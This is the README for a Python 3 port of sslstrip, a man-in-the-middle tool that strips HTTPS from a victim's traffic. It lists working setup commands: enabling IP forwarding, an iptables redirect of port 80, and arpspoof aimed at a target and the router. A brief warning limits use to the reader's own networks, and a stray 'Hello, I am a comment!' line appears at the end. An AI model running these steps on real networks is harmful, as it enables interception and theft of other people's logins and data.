# sslstrip3
implementation of moxie marlinspikes sslstrip im python3

Running:
	sslstrip can be run from the source base without installation.  
	Just run 'python sslstrip.py -h' as a non-root user to get the
	command-line options.

	The four steps to getting this working (assuming you're running Linux)
	are:

	1) Flip your machine into forwarding mode (as root):
	   echo "1" > /proc/sys/net/ipv4/ip_forward

	2) Setup iptables to intercept HTTP requests (as root):
	   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>

	3) Run sslstrip with the command-line options you'd like (see above).

	4) Run arpspoof to redirect traffic to your machine (as root):
	   arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>


more info on moxies github


# info
dont forget to remove the iptables config afterwards
# warning
ssl stripping is prohibited, only try this on your own machines and networks.
Hello, I am a comment!
